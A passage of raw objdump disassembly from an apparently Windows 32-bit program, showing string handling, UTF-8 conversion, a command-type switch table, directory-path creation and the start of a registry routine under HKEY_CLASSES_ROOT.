  40304f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403051:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403055:	8b 55 04             	mov    0x4(%ebp),%edx
  403058:	8b 45 18             	mov    0x18(%ebp),%eax
  40305b:	51                   	push   %ecx
  40305c:	6a 02                	push   $0x2
  40305e:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  403061:	e8 6a 00 00 00       	call   0x4030d0
  403066:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40306a:	8b 55 04             	mov    0x4(%ebp),%edx
  40306d:	8b 45 18             	mov    0x18(%ebp),%eax
  403070:	51                   	push   %ecx
  403071:	6a 03                	push   $0x3
  403073:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  403076:	e8 55 00 00 00       	call   0x4030d0
  40307b:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40307f:	8b 55 04             	mov    0x4(%ebp),%edx
  403082:	8b 45 18             	mov    0x18(%ebp),%eax
  403085:	51                   	push   %ecx
  403086:	6a 04                	push   $0x4
  403088:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  40308b:	e8 40 00 00 00       	call   0x4030d0
  403090:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  403094:	8b 55 04             	mov    0x4(%ebp),%edx
  403097:	8b 45 18             	mov    0x18(%ebp),%eax
  40309a:	51                   	push   %ecx
  40309b:	6a 05                	push   $0x5
  40309d:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  4030a0:	e8 2b 00 00 00       	call   0x4030d0
  4030a5:	8b 45 04             	mov    0x4(%ebp),%eax
  4030a8:	5f                   	pop    %edi
  4030a9:	40                   	inc    %eax
  4030aa:	5e                   	pop    %esi
  4030ab:	89 45 04             	mov    %eax,0x4(%ebp)
  4030ae:	5d                   	pop    %ebp
  4030af:	b8 01 00 00 00       	mov    $0x1,%eax
  4030b4:	5b                   	pop    %ebx
  4030b5:	59                   	pop    %ecx
  4030b6:	c2 18 00             	ret    $0x18
  4030b9:	5f                   	pop    %edi
  4030ba:	5e                   	pop    %esi
  4030bb:	5d                   	pop    %ebp
  4030bc:	33 c0                	xor    %eax,%eax
  4030be:	5b                   	pop    %ebx
  4030bf:	59                   	pop    %ecx
  4030c0:	c2 18 00             	ret    $0x18
  4030c3:	90                   	nop
  4030c4:	90                   	nop
  4030c5:	90                   	nop
  4030c6:	90                   	nop
  4030c7:	90                   	nop
  4030c8:	90                   	nop
  4030c9:	90                   	nop
  4030ca:	90                   	nop
  4030cb:	90                   	nop
  4030cc:	90                   	nop
  4030cd:	90                   	nop
  4030ce:	90                   	nop
  4030cf:	90                   	nop
  4030d0:	53                   	push   %ebx
  4030d1:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4030d5:	56                   	push   %esi
  4030d6:	8b f1                	mov    %ecx,%esi
  4030d8:	85 db                	test   %ebx,%ebx
  4030da:	74 52                	je     0x40312e
  4030dc:	55                   	push   %ebp
  4030dd:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4030e1:	57                   	push   %edi
  4030e2:	8b 44 ae 04          	mov    0x4(%esi,%ebp,4),%eax
  4030e6:	85 c0                	test   %eax,%eax
  4030e8:	74 09                	je     0x4030f3
  4030ea:	50                   	push   %eax
  4030eb:	e8 f6 75 00 00       	call   0x40a6e6
  4030f0:	83 c4 04             	add    $0x4,%esp
  4030f3:	8b fb                	mov    %ebx,%edi
  4030f5:	83 c9 ff             	or     $0xffffffff,%ecx
  4030f8:	33 c0                	xor    %eax,%eax
  4030fa:	f2 ae                	repnz scas %es:(%edi),%al
  4030fc:	f7 d1                	not    %ecx
  4030fe:	51                   	push   %ecx
  4030ff:	e8 dc 75 00 00       	call   0x40a6e0
  403104:	8b d0                	mov    %eax,%edx
  403106:	8b fb                	mov    %ebx,%edi
  403108:	83 c9 ff             	or     $0xffffffff,%ecx
  40310b:	33 c0                	xor    %eax,%eax
  40310d:	83 c4 04             	add    $0x4,%esp
  403110:	89 54 ae 04          	mov    %edx,0x4(%esi,%ebp,4)
  403114:	f2 ae                	repnz scas %es:(%edi),%al
  403116:	f7 d1                	not    %ecx
  403118:	2b f9                	sub    %ecx,%edi
  40311a:	8b c1                	mov    %ecx,%eax
  40311c:	8b f7                	mov    %edi,%esi
  40311e:	8b fa                	mov    %edx,%edi
  403120:	c1 e9 02             	shr    $0x2,%ecx
  403123:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403125:	8b c8                	mov    %eax,%ecx
  403127:	83 e1 03             	and    $0x3,%ecx
  40312a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40312c:	5f                   	pop    %edi
  40312d:	5d                   	pop    %ebp
  40312e:	5e                   	pop    %esi
  40312f:	5b                   	pop    %ebx
  403130:	c2 08 00             	ret    $0x8
  403133:	90                   	nop
  403134:	90                   	nop
  403135:	90                   	nop
  403136:	90                   	nop
  403137:	90                   	nop
  403138:	90                   	nop
  403139:	90                   	nop
  40313a:	90                   	nop
  40313b:	90                   	nop
  40313c:	90                   	nop
  40313d:	90                   	nop
  40313e:	90                   	nop
  40313f:	90                   	nop
  403140:	53                   	push   %ebx
  403141:	8b d9                	mov    %ecx,%ebx
  403143:	56                   	push   %esi
  403144:	57                   	push   %edi
  403145:	c7 03 68 b4 40 00    	movl   $0x40b468,(%ebx)
  40314b:	8d 73 04             	lea    0x4(%ebx),%esi
  40314e:	bf 06 00 00 00       	mov    $0x6,%edi
  403153:	8b 06                	mov    (%esi),%eax
  403155:	85 c0                	test   %eax,%eax
  403157:	74 09                	je     0x403162
  403159:	50                   	push   %eax
  40315a:	e8 87 75 00 00       	call   0x40a6e6
  40315f:	83 c4 04             	add    $0x4,%esp
  403162:	83 c6 04             	add    $0x4,%esi
  403165:	4f                   	dec    %edi
  403166:	75 eb                	jne    0x403153
  403168:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  40316d:	74 09                	je     0x403178
  40316f:	53                   	push   %ebx
  403170:	e8 71 75 00 00       	call   0x40a6e6
  403175:	83 c4 04             	add    $0x4,%esp
  403178:	5f                   	pop    %edi
  403179:	8b c3                	mov    %ebx,%eax
  40317b:	5e                   	pop    %esi
  40317c:	5b                   	pop    %ebx
  40317d:	c2 04 00             	ret    $0x4
  403180:	55                   	push   %ebp
  403181:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  403185:	85 ed                	test   %ebp,%ebp
  403187:	56                   	push   %esi
  403188:	74 60                	je     0x4031ea
  40318a:	8b 35 c8 b0 40 00    	mov    0x40b0c8,%esi
  403190:	55                   	push   %ebp
  403191:	ff d6                	call   *%esi
  403193:	85 c0                	test   %eax,%eax
  403195:	74 53                	je     0x4031ea
  403197:	53                   	push   %ebx
  403198:	57                   	push   %edi
  403199:	55                   	push   %ebp
  40319a:	ff d6                	call   *%esi
  40319c:	8b f0                	mov    %eax,%esi
  40319e:	d1 e6                	shl    $1,%esi
  4031a0:	56                   	push   %esi
  4031a1:	e8 3a 75 00 00       	call   0x40a6e0
  4031a6:	56                   	push   %esi
  4031a7:	8b f8                	mov    %eax,%edi
  4031a9:	e8 32 75 00 00       	call   0x40a6e0
  4031ae:	83 c4 08             	add    $0x8,%esp
  4031b1:	8b d8                	mov    %eax,%ebx
  4031b3:	56                   	push   %esi
  4031b4:	57                   	push   %edi
  4031b5:	6a ff                	push   $0xffffffff
  4031b7:	55                   	push   %ebp
  4031b8:	6a 00                	push   $0x0
  4031ba:	68 e9 fd 00 00       	push   $0xfde9
  4031bf:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  4031c5:	6a 00                	push   $0x0
  4031c7:	6a 00                	push   $0x0
  4031c9:	56                   	push   %esi
  4031ca:	53                   	push   %ebx
  4031cb:	6a ff                	push   $0xffffffff
  4031cd:	57                   	push   %edi
  4031ce:	6a 00                	push   $0x0
  4031d0:	6a 00                	push   $0x0
  4031d2:	ff 15 fc b1 40 00    	call   *0x40b1fc
  4031d8:	57                   	push   %edi
  4031d9:	e8 08 75 00 00       	call   0x40a6e6
  4031de:	83 c4 04             	add    $0x4,%esp
  4031e1:	8b c3                	mov    %ebx,%eax
  4031e3:	5f                   	pop    %edi
  4031e4:	5b                   	pop    %ebx
  4031e5:	5e                   	pop    %esi
  4031e6:	5d                   	pop    %ebp
  4031e7:	c2 04 00             	ret    $0x4
  4031ea:	5e                   	pop    %esi
  4031eb:	b8 28 e7 40 00       	mov    $0x40e728,%eax
  4031f0:	5d                   	pop    %ebp
  4031f1:	c2 04 00             	ret    $0x4
  4031f4:	90                   	nop
  4031f5:	90                   	nop
  4031f6:	90                   	nop
  4031f7:	90                   	nop
  4031f8:	90                   	nop
  4031f9:	90                   	nop
  4031fa:	90                   	nop
  4031fb:	90                   	nop
  4031fc:	90                   	nop
  4031fd:	90                   	nop
  4031fe:	90                   	nop
  4031ff:	90                   	nop
  403200:	6a ff                	push   $0xffffffff
  403202:	68 a3 aa 40 00       	push   $0x40aaa3
  403207:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40320d:	50                   	push   %eax
  40320e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403215:	51                   	push   %ecx
  403216:	8b 44 24 14          	mov    0x14(%esp),%eax
  40321a:	56                   	push   %esi
  40321b:	8b f1                	mov    %ecx,%esi
  40321d:	50                   	push   %eax
  40321e:	89 74 24 08          	mov    %esi,0x8(%esp)
  403222:	e8 f9 2c 00 00       	call   0x405f20
  403227:	8a 4c 24 18          	mov    0x18(%esp),%cl
  40322b:	6a 18                	push   $0x18
  40322d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  403234:	00 
  403235:	88 4e 10             	mov    %cl,0x10(%esi)
  403238:	e8 a3 74 00 00       	call   0x40a6e0
  40323d:	89 00                	mov    %eax,(%eax)
  40323f:	89 40 04             	mov    %eax,0x4(%eax)
  403242:	83 c4 04             	add    $0x4,%esp
  403245:	89 46 14             	mov    %eax,0x14(%esi)
  403248:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  40324f:	8b ce                	mov    %esi,%ecx
  403251:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  403256:	c7 06 6c b4 40 00    	movl   $0x40b46c,(%esi)
  40325c:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  403263:	e8 b8 05 00 00       	call   0x403820
  403268:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40326c:	8b c6                	mov    %esi,%eax
  40326e:	5e                   	pop    %esi
  40326f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403276:	83 c4 10             	add    $0x10,%esp
  403279:	c2 04 00             	ret    $0x4
  40327c:	90                   	nop
  40327d:	90                   	nop
  40327e:	90                   	nop
  40327f:	90                   	nop
  403280:	56                   	push   %esi
  403281:	8b f1                	mov    %ecx,%esi
  403283:	e8 18 00 00 00       	call   0x4032a0
  403288:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40328d:	74 09                	je     0x403298
  40328f:	56                   	push   %esi
  403290:	e8 51 74 00 00       	call   0x40a6e6
  403295:	83 c4 04             	add    $0x4,%esp
  403298:	8b c6                	mov    %esi,%eax
  40329a:	5e                   	pop    %esi
  40329b:	c2 04 00             	ret    $0x4
  40329e:	90                   	nop
  40329f:	90                   	nop
  4032a0:	6a ff                	push   $0xffffffff
  4032a2:	68 c3 aa 40 00       	push   $0x40aac3
  4032a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4032ad:	50                   	push   %eax
  4032ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4032b5:	83 ec 0c             	sub    $0xc,%esp
  4032b8:	53                   	push   %ebx
  4032b9:	55                   	push   %ebp
  4032ba:	56                   	push   %esi
  4032bb:	57                   	push   %edi
  4032bc:	8b f9                	mov    %ecx,%edi
  4032be:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4032c2:	c7 07 6c b4 40 00    	movl   $0x40b46c,(%edi)
  4032c8:	8b 6f 14             	mov    0x14(%edi),%ebp
  4032cb:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  4032d2:	00 
  4032d3:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4032d6:	3b dd                	cmp    %ebp,%ebx
  4032d8:	74 32                	je     0x40330c
  4032da:	8b f3                	mov    %ebx,%esi
  4032dc:	8b 1b                	mov    (%ebx),%ebx
  4032de:	6a 01                	push   $0x1
  4032e0:	8b 46 04             	mov    0x4(%esi),%eax
  4032e3:	8b 0e                	mov    (%esi),%ecx
  4032e5:	89 08                	mov    %ecx,(%eax)
  4032e7:	8b 16                	mov    (%esi),%edx
  4032e9:	8b 46 04             	mov    0x4(%esi),%eax
  4032ec:	8d 4e 08             	lea    0x8(%esi),%ecx
  4032ef:	89 42 04             	mov    %eax,0x4(%edx)
  4032f2:	ff 15 2c b2 40 00    	call   *0x40b22c
  4032f8:	56                   	push   %esi
  4032f9:	e8 e8 73 00 00       	call   0x40a6e6
  4032fe:	8b 4f 18             	mov    0x18(%edi),%ecx
  403301:	83 c4 04             	add    $0x4,%esp
  403304:	49                   	dec    %ecx
  403305:	3b dd                	cmp    %ebp,%ebx
  403307:	89 4f 18             	mov    %ecx,0x18(%edi)
  40330a:	75 ce                	jne    0x4032da
  40330c:	8b 5f 14             	mov    0x14(%edi),%ebx
  40330f:	c6 44 24 24 00       	movb   $0x0,0x24(%esp)
  403314:	8b 2b                	mov    (%ebx),%ebp
  403316:	3b eb                	cmp    %ebx,%ebp
  403318:	74 48                	je     0x403362
  40331a:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40331e:	6a 00                	push   $0x0
  403320:	8b c5                	mov    %ebp,%eax
  403322:	8b 6d 00             	mov    0x0(%ebp),%ebp
  403325:	51                   	push   %ecx
  403326:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40332a:	89 44 24 18          	mov    %eax,0x18(%esp)
  40332e:	e8 4d 13 00 00       	call   0x404680
  403333:	8b 30                	mov    (%eax),%esi
  403335:	6a 00                	push   $0x0
  403337:	8b 46 04             	mov    0x4(%esi),%eax
  40333a:	8b 16                	mov    (%esi),%edx
  40333c:	89 10                	mov    %edx,(%eax)
  40333e:	8b 06                	mov    (%esi),%eax
  403340:	8b 4e 04             	mov    0x4(%esi),%ecx
  403343:	89 48 04             	mov    %ecx,0x4(%eax)
  403346:	8d 4e 08             	lea    0x8(%esi),%ecx
  403349:	e8 d2 14 00 00       	call   0x404820
  40334e:	56                   	push   %esi
  40334f:	e8 92 73 00 00       	call   0x40a6e6
  403354:	8b 4f 18             	mov    0x18(%edi),%ecx
  403357:	83 c4 04             	add    $0x4,%esp
  40335a:	49                   	dec    %ecx
  40335b:	3b eb                	cmp    %ebx,%ebp
  40335d:	89 4f 18             	mov    %ecx,0x18(%edi)
  403360:	75 b8                	jne    0x40331a
  403362:	8b 47 14             	mov    0x14(%edi),%eax
  403365:	50                   	push   %eax
  403366:	e8 7b 73 00 00       	call   0x40a6e6
  40336b:	33 c0                	xor    %eax,%eax
  40336d:	83 c4 04             	add    $0x4,%esp
  403370:	8b cf                	mov    %edi,%ecx
  403372:	89 47 14             	mov    %eax,0x14(%edi)
  403375:	89 47 18             	mov    %eax,0x18(%edi)
  403378:	c7 44 24 24 ff ff ff 	movl   $0xffffffff,0x24(%esp)
  40337f:	ff 
  403380:	e8 eb 2b 00 00       	call   0x405f70
  403385:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403389:	5f                   	pop    %edi
  40338a:	5e                   	pop    %esi
  40338b:	5d                   	pop    %ebp
  40338c:	5b                   	pop    %ebx
  40338d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403394:	83 c4 18             	add    $0x18,%esp
  403397:	c3                   	ret
  403398:	90                   	nop
  403399:	90                   	nop
  40339a:	90                   	nop
  40339b:	90                   	nop
  40339c:	90                   	nop
  40339d:	90                   	nop
  40339e:	90                   	nop
  40339f:	90                   	nop
  4033a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4033a4:	56                   	push   %esi
  4033a5:	8b f1                	mov    %ecx,%esi
  4033a7:	33 c9                	xor    %ecx,%ecx
  4033a9:	8a 08                	mov    (%eax),%cl
  4033ab:	83 c1 fe             	add    $0xfffffffe,%ecx
  4033ae:	83 f9 0d             	cmp    $0xd,%ecx
  4033b1:	0f 87 c5 00 00 00    	ja     0x40347c
  4033b7:	ff 24 8d 80 34 40 00 	jmp    *0x403480(,%ecx,4)
  4033be:	40                   	inc    %eax
  4033bf:	8b ce                	mov    %esi,%ecx
  4033c1:	50                   	push   %eax
  4033c2:	e8 19 06 00 00       	call   0x4039e0
  4033c7:	5e                   	pop    %esi
  4033c8:	c2 08 00             	ret    $0x8
  4033cb:	40                   	inc    %eax
  4033cc:	50                   	push   %eax
  4033cd:	ff 15 fc b0 40 00    	call   *0x40b0fc
  4033d3:	6a 6c                	push   $0x6c
  4033d5:	8b ce                	mov    %esi,%ecx
  4033d7:	e8 04 0b 00 00       	call   0x403ee0
  4033dc:	5e                   	pop    %esi
  4033dd:	c2 08 00             	ret    $0x8
  4033e0:	40                   	inc    %eax
  4033e1:	8b ce                	mov    %esi,%ecx
  4033e3:	50                   	push   %eax
  4033e4:	e8 c7 07 00 00       	call   0x403bb0
  4033e9:	6a 6c                	push   $0x6c
  4033eb:	8b ce                	mov    %esi,%ecx
  4033ed:	e8 ee 0a 00 00       	call   0x403ee0
  4033f2:	5e                   	pop    %esi
  4033f3:	c2 08 00             	ret    $0x8
  4033f6:	40                   	inc    %eax
  4033f7:	8b ce                	mov    %esi,%ecx
  4033f9:	50                   	push   %eax
  4033fa:	e8 f1 0a 00 00       	call   0x403ef0
  4033ff:	5e                   	pop    %esi
  403400:	c2 08 00             	ret    $0x8
  403403:	40                   	inc    %eax
  403404:	8b ce                	mov    %esi,%ecx
  403406:	50                   	push   %eax
  403407:	e8 84 09 00 00       	call   0x403d90
  40340c:	5e                   	pop    %esi
  40340d:	c2 08 00             	ret    $0x8
  403410:	40                   	inc    %eax
  403411:	8b ce                	mov    %esi,%ecx
  403413:	50                   	push   %eax
  403414:	e8 87 11 00 00       	call   0x4045a0
  403419:	5e                   	pop    %esi
  40341a:	c2 08 00             	ret    $0x8
  40341d:	40                   	inc    %eax
  40341e:	8b ce                	mov    %esi,%ecx
  403420:	50                   	push   %eax
  403421:	e8 9a 11 00 00       	call   0x4045c0
  403426:	5e                   	pop    %esi
  403427:	c2 08 00             	ret    $0x8
  40342a:	8b ce                	mov    %esi,%ecx
  40342c:	e8 0f 0e 00 00       	call   0x404240
  403431:	5e                   	pop    %esi
  403432:	c2 08 00             	ret    $0x8
  403435:	40                   	inc    %eax
  403436:	8b ce                	mov    %esi,%ecx
  403438:	50                   	push   %eax
  403439:	e8 42 11 00 00       	call   0x404580
  40343e:	5e                   	pop    %esi
  40343f:	c2 08 00             	ret    $0x8
  403442:	40                   	inc    %eax
  403443:	8b ce                	mov    %esi,%ecx
  403445:	50                   	push   %eax
  403446:	e8 b5 0e 00 00       	call   0x404300
  40344b:	5e                   	pop    %esi
  40344c:	c2 08 00             	ret    $0x8
  40344f:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403453:	49                   	dec    %ecx
  403454:	40                   	inc    %eax
  403455:	51                   	push   %ecx
  403456:	50                   	push   %eax
  403457:	8b ce                	mov    %esi,%ecx
  403459:	e8 82 10 00 00       	call   0x4044e0
  40345e:	5e                   	pop    %esi
  40345f:	c2 08 00             	ret    $0x8
  403462:	40                   	inc    %eax
  403463:	6a 05                	push   $0x5
  403465:	50                   	push   %eax
  403466:	8b ce                	mov    %esi,%ecx
  403468:	e8 d3 01 00 00       	call   0x403640
  40346d:	5e                   	pop    %esi
  40346e:	c2 08 00             	ret    $0x8
  403471:	40                   	inc    %eax
  403472:	6a 00                	push   $0x0
  403474:	50                   	push   %eax
  403475:	8b ce                	mov    %esi,%ecx
  403477:	e8 c4 01 00 00       	call   0x403640
  40347c:	5e                   	pop    %esi
  40347d:	c2 08 00             	ret    $0x8
  403480:	be 33 40 00 f6       	mov    $0xf6004033,%esi
  403485:	33 40 00             	xor    0x0(%eax),%eax
  403488:	42                   	inc    %edx
  403489:	34 40                	xor    $0x40,%al
  40348b:	00 4f 34             	add    %cl,0x34(%edi)
  40348e:	40                   	inc    %eax
  40348f:	00 7c 34 40          	add    %bh,0x40(%esp,%esi,1)
  403493:	00 03                	add    %al,(%ebx)
  403495:	34 40                	xor    $0x40,%al
  403497:	00 2a                	add    %ch,(%edx)
  403499:	34 40                	xor    $0x40,%al
  40349b:	00 cb                	add    %cl,%bl
  40349d:	33 40 00             	xor    0x0(%eax),%eax
  4034a0:	e0 33                	loopne 0x4034d5
  4034a2:	40                   	inc    %eax
  4034a3:	00 35 34 40 00 10    	add    %dh,0x10004034
  4034a9:	34 40                	xor    $0x40,%al
  4034ab:	00 1d 34 40 00 62    	add    %bl,0x62004034
  4034b1:	34 40                	xor    $0x40,%al
  4034b3:	00 71 34             	add    %dh,0x34(%ecx)
  4034b6:	40                   	inc    %eax
  4034b7:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  4034bd:	90                   	nop
  4034be:	90                   	nop
  4034bf:	90                   	nop
  4034c0:	55                   	push   %ebp
  4034c1:	8b ec                	mov    %esp,%ebp
  4034c3:	6a ff                	push   $0xffffffff
  4034c5:	68 78 b4 40 00       	push   $0x40b478
  4034ca:	68 62 a7 40 00       	push   $0x40a762
  4034cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4034d5:	50                   	push   %eax
  4034d6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4034dd:	83 ec 14             	sub    $0x14,%esp
  4034e0:	53                   	push   %ebx
  4034e1:	56                   	push   %esi
  4034e2:	57                   	push   %edi
  4034e3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4034e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4034ed:	8b 75 08             	mov    0x8(%ebp),%esi
  4034f0:	56                   	push   %esi
  4034f1:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4034f7:	40                   	inc    %eax
  4034f8:	50                   	push   %eax
  4034f9:	ff 15 5c b2 40 00    	call   *0x40b25c
  4034ff:	83 c4 04             	add    $0x4,%esp
  403502:	8b f8                	mov    %eax,%edi
  403504:	89 7d dc             	mov    %edi,-0x24(%ebp)
  403507:	85 ff                	test   %edi,%edi
  403509:	0f 84 0e 01 00 00    	je     0x40361d
  40350f:	56                   	push   %esi
  403510:	57                   	push   %edi
  403511:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  403517:	8b f7                	mov    %edi,%esi
  403519:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40351c:	80 3f 5c             	cmpb   $0x5c,(%edi)
  40351f:	75 4b                	jne    0x40356c
  403521:	8d 47 01             	lea    0x1(%edi),%eax
  403524:	80 38 5c             	cmpb   $0x5c,(%eax)
  403527:	75 43                	jne    0x40356c
  403529:	8b f0                	mov    %eax,%esi
  40352b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40352e:	46                   	inc    %esi
  40352f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403532:	8a 06                	mov    (%esi),%al
  403534:	84 c0                	test   %al,%al
  403536:	74 0f                	je     0x403547
  403538:	3c 5c                	cmp    $0x5c,%al
  40353a:	74 0b                	je     0x403547
  40353c:	56                   	push   %esi
  40353d:	ff 15 80 b3 40 00    	call   *0x40b380
  403543:	8b f0                	mov    %eax,%esi
  403545:	eb e8                	jmp    0x40352f
  403547:	80 3e 00             	cmpb   $0x0,(%esi)
  40354a:	74 04                	je     0x403550
  40354c:	46                   	inc    %esi
  40354d:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403550:	8a 06                	mov    (%esi),%al
  403552:	84 c0                	test   %al,%al
  403554:	74 0f                	je     0x403565
  403556:	3c 5c                	cmp    $0x5c,%al
  403558:	74 0b                	je     0x403565
  40355a:	56                   	push   %esi
  40355b:	ff 15 80 b3 40 00    	call   *0x40b380
  403561:	8b f0                	mov    %eax,%esi
  403563:	eb e8                	jmp    0x40354d
  403565:	80 3e 00             	cmpb   $0x0,(%esi)
  403568:	74 21                	je     0x40358b
  40356a:	eb 1b                	jmp    0x403587
  40356c:	8d 47 01             	lea    0x1(%edi),%eax
  40356f:	80 38 3a             	cmpb   $0x3a,(%eax)
  403572:	75 17                	jne    0x40358b
  403574:	8b f0                	mov    %eax,%esi
  403576:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403579:	46                   	inc    %esi
  40357a:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40357d:	8a 06                	mov    (%esi),%al
  40357f:	84 c0                	test   %al,%al
  403581:	74 08                	je     0x40358b
  403583:	3c 5c                	cmp    $0x5c,%al
  403585:	75 04                	jne    0x40358b
  403587:	46                   	inc    %esi
  403588:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40358b:	8b 1d 08 b1 40 00    	mov    0x40b108,%ebx
  403591:	8a 06                	mov    (%esi),%al
  403593:	84 c0                	test   %al,%al
  403595:	74 4a                	je     0x4035e1
  403597:	3c 5c                	cmp    $0x5c,%al
  403599:	75 38                	jne    0x4035d3
  40359b:	c6 06 00             	movb   $0x0,(%esi)
  40359e:	57                   	push   %edi
  40359f:	ff d3                	call   *%ebx
  4035a1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4035a4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4035a7:	75 1d                	jne    0x4035c6
  4035a9:	6a 00                	push   $0x0
  4035ab:	57                   	push   %edi
  4035ac:	ff 15 04 b1 40 00    	call   *0x40b104
  4035b2:	85 c0                	test   %eax,%eax
  4035b4:	75 1a                	jne    0x4035d0
  4035b6:	ff 15 00 b1 40 00    	call   *0x40b100
  4035bc:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4035c1:	74 0d                	je     0x4035d0
  4035c3:	57                   	push   %edi
  4035c4:	eb 4e                	jmp    0x403614
  4035c6:	83 e0 10             	and    $0x10,%eax
  4035c9:	3c 10                	cmp    $0x10,%al
  4035cb:	74 03                	je     0x4035d0
  4035cd:	57                   	push   %edi
  4035ce:	eb 44                	jmp    0x403614
  4035d0:	c6 06 5c             	movb   $0x5c,(%esi)
  4035d3:	56                   	push   %esi
  4035d4:	ff 15 80 b3 40 00    	call   *0x40b380
  4035da:	8b f0                	mov    %eax,%esi
  4035dc:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4035df:	eb b0                	jmp    0x403591
  4035e1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4035e8:	57                   	push   %edi
  4035e9:	ff 15 60 b2 40 00    	call   *0x40b260
  4035ef:	83 c4 04             	add    $0x4,%esp
  4035f2:	b0 01                	mov    $0x1,%al
  4035f4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4035f7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4035fe:	5f                   	pop    %edi
  4035ff:	5e                   	pop    %esi
  403600:	5b                   	pop    %ebx
  403601:	8b e5                	mov    %ebp,%esp
  403603:	5d                   	pop    %ebp
  403604:	c2 04 00             	ret    $0x4
  403607:	b8 01 00 00 00       	mov    $0x1,%eax
  40360c:	c3                   	ret
  40360d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403610:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403613:	50                   	push   %eax
  403614:	ff 15 60 b2 40 00    	call   *0x40b260
  40361a:	83 c4 04             	add    $0x4,%esp
  40361d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403624:	32 c0                	xor    %al,%al
  403626:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403629:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403630:	5f                   	pop    %edi
  403631:	5e                   	pop    %esi
  403632:	5b                   	pop    %ebx
  403633:	8b e5                	mov    %ebp,%esp
  403635:	5d                   	pop    %ebp
  403636:	c2 04 00             	ret    $0x4
  403639:	90                   	nop
  40363a:	90                   	nop
  40363b:	90                   	nop
  40363c:	90                   	nop
  40363d:	90                   	nop
  40363e:	90                   	nop
  40363f:	90                   	nop
  403640:	81 ec 54 03 00 00    	sub    $0x354,%esp
  403646:	53                   	push   %ebx
  403647:	55                   	push   %ebp
  403648:	56                   	push   %esi
  403649:	57                   	push   %edi
  40364a:	b9 41 00 00 00       	mov    $0x41,%ecx
  40364f:	33 c0                	xor    %eax,%eax
  403651:	8d 7c 24 6c          	lea    0x6c(%esp),%edi
  403655:	6a 2e                	push   $0x2e
  403657:	f3 ab                	rep stos %eax,%es:(%edi)
  403659:	8b 84 24 6c 03 00 00 	mov    0x36c(%esp),%eax
  403660:	c7 44 24 18 04 01 00 	movl   $0x104,0x18(%esp)
  403667:	00 
  403668:	50                   	push   %eax
  403669:	ff 15 68 b2 40 00    	call   *0x40b268
  40366f:	83 c4 08             	add    $0x8,%esp
  403672:	85 c0                	test   %eax,%eax
  403674:	75 0f                	jne    0x403685
  403676:	5f                   	pop    %edi
  403677:	5e                   	pop    %esi
  403678:	5d                   	pop    %ebp
  403679:	32 c0                	xor    %al,%al
  40367b:	5b                   	pop    %ebx
  40367c:	81 c4 54 03 00 00    	add    $0x354,%esp
  403682:	c2 08 00             	ret    $0x8
  403685:	8b 2d 14 b0 40 00    	mov    0x40b014,%ebp
  40368b:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40368f:	51                   	push   %ecx
  403690:	68 3f 00 0f 00       	push   $0xf003f
  403695:	6a 00                	push   $0x0
  403697:	50                   	push   %eax
  403698:	68 00 00 00 80       	push   $0x80000000
  40369d:	ff d5                	call   *%ebp
